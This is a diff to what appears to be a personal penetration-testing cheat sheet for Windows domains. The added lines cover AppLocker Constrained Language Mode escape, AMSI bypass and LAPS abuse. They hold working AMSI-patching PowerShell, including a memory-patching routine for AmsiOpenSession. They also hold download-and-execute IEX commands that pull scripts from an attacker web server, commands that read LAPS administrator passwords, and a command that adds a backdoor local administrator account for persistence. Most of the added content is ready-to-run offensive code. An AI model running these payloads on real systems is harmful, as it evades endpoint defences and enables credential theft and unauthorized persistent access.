@@ -208,12 +208,81 @@ xfreerdp /v:192.168.12.34 /u:Administrator /p:12345abcde
 
 The Constrained Language Mode is something we may well find ourselves dumped in once we get a foothold on a machine. This constraint is placed on us by the deployment of AppLocker on the host. AppLocker has had (and apparently continues to have) difficulties being effectively applied to custom runspaces that are created from within a Powershell session. Therefore a reliable bypass is available in the form of creating a custom runspace and deploying a new reverse shell from there.
 
-It is likely that in the same instant we may be faced with the need to execute an AMSI bypass, since our elevation to Full Language Mode may well be picked up on by Defender or another EDR. There are a _lot_ of approaches to AMSI bypass, to the extent that it doesn't seem helpful to list any here, but here's a good resource: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
-
-For our purposes there is a convenient `.csproj` file kindly provided by the author of this repo that hits both of these at the same time and returns us a convenient reverse shell: https://github.com/Sh3lldon/FullBypass/tree/main
+For our purposes there is a convenient `.csproj` file kindly provided by the author of this repo that returns a reverse shell from inside the custom runspace: https://github.com/Sh3lldon/FullBypass/tree/main
 
 Having copied the `.csproj` to an appropriate writable dir, eg. `C:\Windows\Tasks` or `C:\Windows\Temp`, simply run via `msbuild.exe`:
 ```powershell
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe .\FullBypass.csproj
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\FullBypass.csproj
 ```
 
+### AMSI Bypass
+
+There are a _lot_ of approaches to AMSI bypass, to the extent that it doesn't seem helpful to list them here, but here's a good resource: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
+
+Two that we'll keep in our backpocket are presented here, this first one should be run directly in the console as a one-liner:
+```powershell
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+```
+
+This one should be saved as a payload and executed via the DownloadString | IEX method:
+```powershell
+function LookupFunc {
+	Param ($moduleName, $functionName)
+	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+function getDelegateType {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+		[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+	$type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+      DefineDynamicModule('InMemoryModule', $false).
+      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
+      [System.MulticastDelegate])
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+	return $type.CreateType()
+}
+```
+Having saved the functions above in a script called `heavy-ams-bypass.ps1` and serving it on a suitable web server:
+```powershell
+IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/heavy-ams-bypass.ps1'));[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession;$oldProtectionBuffer = 0;$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])));$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+```
+
+### LAPS
+
+The Local Administrator Password Solution is intended to help administrators manage the local administrator credentials of domain joined machines. A consequence is that cleartext credentials for the local administrator exist on machines that use LAPS.
+
+These credentials are protected by group membership naturally. Explicit privileges to read LAPS data are needed. As is always the case with this sort of thing, there's every chance that this has been misconfigured.
+
+To enumerate groups with the privilege required to read LAPS data:
+```bash
+IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/LAPSToolkit.ps1')); Find-LAPSDelegatedGroups
+```
+Get that groups membership:
+```bash
+Get-NetGroupMember -GroupName "<insert relevant group>"
+```
+To retrieve the Administrator password:
+```bash
+IEX ((New-Object System.Net.WebClient).DownloadString('http://192.168.x.y/LAPSToolkit.ps1')); Get-LAPSComputers
+```
+
+To leverage this to persist access:
+```powershell
+$username = "$hostname\Administrator"
+$password = ConvertTo-SecureString "YourLAPSAdminPassword" -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential($username, $password)
+Invoke-Command -ComputerName $hostname -Credential $credential -ScriptBlock { net user ggilligan12 password123! /add; net localgroup administrators ggilligan12 /add}
+```
